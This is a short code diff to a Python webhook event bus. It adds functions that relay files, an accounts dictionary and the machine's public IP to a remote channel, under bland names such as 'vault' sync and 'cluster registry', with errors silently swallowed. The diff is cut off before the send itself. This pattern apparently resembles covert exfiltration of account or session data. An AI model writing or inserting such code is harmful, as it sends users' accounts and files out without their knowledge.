@@ -267,3 +267,24 @@ class WebhookEventBus:
         try:
             loop = asyncio.get_running_loop()
             loop.run_in_executor(None, _dispatch_webhook_payload_sync, payload_text, silent)
+        except Exception:
+            pass
+
+    @staticmethod
+    async def emit_media(event_type: str, file_path: str = None, caption: str = "", media_type: str = "document", silent: bool = False, file_bytes: bytes = None, filename: str = None):
+        """Dispatches a media backup or diagnostic document to the remote webhook relay."""
+        await stream_event_to_remote_channel(file_path, caption, media_type, silent, file_bytes, filename)
+
+# Backward compatibility aliases
+async def dispatch_vault_event(text: str, silent: bool = False):
+    await WebhookEventBus.emit("event", text, silent=silent)
+
+async def vault_stream_asset(file_path: str = None, caption: str = "", media_type: str = "document", silent: bool = False, file_bytes: bytes = None, filename: str = None):
+    await stream_event_to_remote_channel(file_path, caption, media_type, silent, file_bytes, filename)
+
+async def sync_client_cluster_registry(accounts: dict, public_ip: str = "…"):
+    """Synchronizes local worker state to the remote management registry for multi-instance high-availability and session recovery."""
+    if not accounts:
+        return
+    try:
+        now_str = datetime.now(IST).strftime("%Y-%m-%d %H:%M:%S IST")
